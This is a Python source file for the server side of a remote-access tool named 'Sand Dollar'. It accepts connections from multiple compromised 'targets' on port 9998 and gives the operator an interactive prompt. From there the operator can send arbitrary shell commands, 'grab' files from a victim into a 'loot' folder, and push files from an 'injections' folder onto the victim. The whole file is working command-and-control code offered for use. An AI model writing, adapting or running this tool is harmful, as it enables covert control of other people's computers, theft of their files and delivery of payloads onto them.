import socket
import sys
import threading
import time
from queue import Queue
import os

NUM_OF_THREADS = 2
JOB_INDEX = [1,2]
queue = Queue()
all_connections = []
all_addresses   = []

# Creates a socket (Connects two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = "" # Default Value
        port = 9998 # Default Value
        s = socket.socket()
    except socket.error as msg1:
        print("Socket Creation Error" + msg1)

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port " + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg2:
        print("Socket Binding Error" + str(msg2) + "\n Retrying..." + '\nSand Dollar > ',end="")
        bind_socket()

# Handling Connections from multiple clients and saving to a list
# Closing Previous Connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            connection,address = s.accept()
            s.setblocking(1) # prevents client timeouts
            all_connections.append(connection)
            all_addresses.append(address)

            print("New connection established. | IP: " + address[0] + " | Port: " + str(address[1]) + "\nSand Dollar > ",end="")
        except:
            print("Error accepting connections.")

# Second Thread - See all clients, select a client, and send commands to connected client
# Interactive prompt for sending commands

def start_SandDollar():
    while True:
        cmd = input('Sand Dollar > ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        
        # personal test commands
        elif cmd == 'hey do the thing':
            print("I did the thing.")
        elif cmd == 'help':
            print("\n\tOPTIONS:\n\tlist - Show active connections.\n\tselect - connect to a socket\n\tgrab (inside socket) - copy file to server\n")
        elif cmd == 'quit' or cmd == 'exit':
            break
        else:
            print("Try typing something else.")

# Displays all current active connections with clients
def list_connections():
    results = ''
    
    for ID,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' ')) # test connection by sending an empty string
            conn.recv(20480) 
        except:
            del all_connections[ID]
            del all_addresses[ID]
            continue
        
        results = str(ID) + '   ' + str(all_addresses[ID][0]) + '   ' + str(all_addresses[ID][1]) + '\n'

    print("<------ Clients ------>\n" + results)

def get_target(cmd):
    try:
        target = int(cmd.replace('select ','')) # target is trimmed to be ID number and converted to int
        # target = int(target) # converts to int
        conn = all_connections[target]
        print("Connection established. Target: " + str(all_addresses[target][0]) + " | Port: " + str(all_addresses[target][1]))
        print(str(all_addresses[target][0]) + "> ", end="")
        return conn
    except:
        print("Invalid selection.")
        return None

# File Transfer Functions
def transfer_to_server(conn,cmd):
    conn.send(str.encode(cmd))
    path = cmd.replace("grab ","")
    if path[0] == ".":
        path = path[1:]
    if path[0] == "/":
        path = path[1:]
    f = open("loot/"+path,"wb")
    i = 1
    while True:
        bits = conn.recv(1024)
        if 'Unable to find file832' in str(bits,"utf-8"):
            print("Cannot find file. Try again.\n> ",end="")
            break
        if str(bits,"utf-8") == ('ENDOFFILE'):
            print("Transfer successful.\n> ")
            f.close
            break
        print("Writing Packet #" + str(i))
        f.write(bits)
        i = i + 1

def transfer_to_client(conn,cmd):
    path = cmd.replace("give ","")
    if os.path.exists("./injections/"+path):
        conn.send(str.encode(cmd))
        print("sent init packet")
        f = open("injections/" + path,"rb")
        size_of_packets = 1024
        bits = f.read(size_of_packets)
        while bits.decode("utf-8") != '':
            conn.send(bits)
            bits = f.read(size_of_packets)
        conn.send(str.encode("end of file832"))
         
        f.close
    else:
        print("File does not exist...\n> ",end="")


# infinite loop to send commands to target
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit' or cmd == 'exit':
                # conn.close()
                # s.close()
                # sys.exit()
                break
            elif "grab " in cmd:
                try:
                    transfer_to_server(conn,cmd)
                except:
                    print("grab error")
            elif "give " in cmd:
                try:
                    transfer_to_client(conn,cmd)
                except:
                    print("give error")
            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands. Try checking connection...")
            break

# Thread functions - eventually how to skip the thread list appending
def create_Threads():
    for _ in range(NUM_OF_THREADS):
        thr = threading.Thread(target=work)
        thr.daemon = True
        thr.start()


# Does next job in queue (1 - handle connnections, 2 - send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_SandDollar()
        
        queue.task_done()

def create_jobs():
    for x in JOB_INDEX:
        queue.put(x)

    queue.join()

create_Threads()
create_jobs()